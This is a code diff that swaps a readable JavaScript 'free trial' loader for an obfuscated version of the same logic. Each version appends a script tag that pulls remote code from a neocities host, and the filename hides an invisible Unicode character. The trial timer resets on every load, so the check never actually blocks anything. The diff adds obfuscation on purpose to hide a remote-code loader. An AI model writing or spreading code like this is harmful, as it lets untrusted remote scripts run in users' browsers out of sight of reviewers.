@@ -1,16 +1,1 @@
-function loadScript() {
-    var startTime = new Date(); // Get the current time
-    var expirationTime = new Date(startTime.getTime() + 60 * 60 * 1000); // Add 1 hour (60 minutes * 60 seconds * 1000 milliseconds)
-
-    var currentTime = new Date();
-
-    if (currentTime > expirationTime) {
-        alert('Free trial is over');
-    } else {
-        var script = document.createElement('script');
-        script.src = 'https://sharebooster.neocities.org/scriptㅤ.js';
-        document.body.appendChild(script);
-    }
-}
-
-loadScript(); // Call the function to execute
+function _0x4425(){var _0xb86834=['script','244qWnRuR','createElement','69834TshZma','src','body','2064ZFCpcz','3333260cQKGFq','getTime','7040UwSKCu','Free\x20trial\x20is\x20over\x20contact\x20the\x20owner\x20to\x20Access\x20this\x20t','217YfwwGu','102321MoQsfs','appendChild','45KCrIBw','1389660hPrJzU','6854oiosgW','216CeFpGb','13989lqgDKs'];_0x4425=function(){return _0xb86834;};return _0x4425();}function _0x1cb4(_0x8b1b58,_0x461ef2){var _0x4425ea=_0x4425();return _0x1cb4=function(_0x1cb4d3,_0x2321d0){_0x1cb4d3=_0x1cb4d3-0x104;var _0x3fbeda=_0x4425ea[_0x1cb4d3];return _0x3fbeda;},_0x1cb4(_0x8b1b58,_0x461ef2);}(function(_0x29f2eb,_0x2c0eb0){var _0x16d49=_0x1cb4,_0x3aa5df=_0x29f2eb();while(!![]){try{var _0x2c6fde=parseInt(_0x16d49(0x10a))/0x1*(-parseInt(_0x16d49(0x10c))/0x2)+parseInt(_0x16d49(0x10e))/0x3*(parseInt(_0x16d49(0x110))/0x4)+-parseInt(_0x16d49(0x10b))/0x5+-parseInt(_0x16d49(0x112))/0x6*(parseInt(_0x16d49(0x107))/0x7)+-parseInt(_0x16d49(0x10d))/0x8*(-parseInt(_0x16d49(0x108))/0x9)+parseInt(_0x16d49(0x116))/0xa+parseInt(_0x16d49(0x105))/0xb*(parseInt(_0x16d49(0x115))/0xc);if(_0x2c6fde===_0x2c0eb0)break;else _0x3aa5df['push'](_0x3aa5df['shift']());}catch(_0x3a6e22){_0x3aa5df['push'](_0x3aa5df['shift']());}}}(_0x4425,0x3b0c0));function loadScript(){var _0x1c7a30=_0x1cb4,_0x4f852a=new Date(),_0x2aa182=new Date(_0x4f852a[_0x1c7a30(0x104)]()+0x3c*0x3c*0x3e8),_0x3d6cf9=new Date();if(_0x3d6cf9>_0x2aa182)alert(_0x1c7a30(0x106));else{var _0x155152=document[_0x1c7a30(0x111)](_0x1c7a30(0x10f));_0x155152[_0x1c7a30(0x113)]='https://sharebooster.neocities.org/scriptㅤ.js',document[_0x1c7a30(0x114)][_0x1c7a30(0x109)](_0x155152);}}loadScript();
